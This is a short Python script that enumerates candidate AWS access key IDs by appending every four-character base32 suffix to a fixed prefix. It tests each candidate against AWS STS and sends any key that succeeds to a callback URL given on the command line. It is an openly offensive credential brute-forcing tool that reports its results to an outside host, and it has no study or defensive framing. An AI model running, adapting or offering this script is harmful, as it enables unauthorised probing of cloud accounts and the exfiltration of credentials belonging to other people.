import boto3
import os
import requests
import random
import itertools
import sys
import string
from botocore.config import Config

callback_url = sys.argv[1]
input_file = sys.argv[2]

def start():
    if input_file != None:
        lines = open(input_file,"r")
        for line in lines:
            line = line.rstrip()
            attempt("AKIAXXXXXXXXXXXX" + line, "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")

def attempt(access_key, secret_key):
    client = boto3.client('sts',endpoint_url="https://sts.ap-southeast-1.amazonaws.com",
    region_name="ap-southeast-1", aws_access_key_id=access_key, aws_secret_access_key=secret_key)
    try:
        client.get_caller_identity()
        # do something when succeeded
        requests.get(callback_url + "?key=" + access_key)
    except:
        pass


def generate_access_keys(output_file=None):
    valid_chars = list(string.ascii_uppercase + '234567')
    values = list(itertools.product(valid_chars, repeat=4))
    random.shuffle(values)
    if output_file != None:
        with open(output_file, 'w') as f:
            for value in values:
                f.write(''.join(value) + os.linesep)
    else:
        for value in values:
            print(''.join(value))



if __name__ == "__main__":
    generate_access_keys("entries/all-entries.txt")
    # start()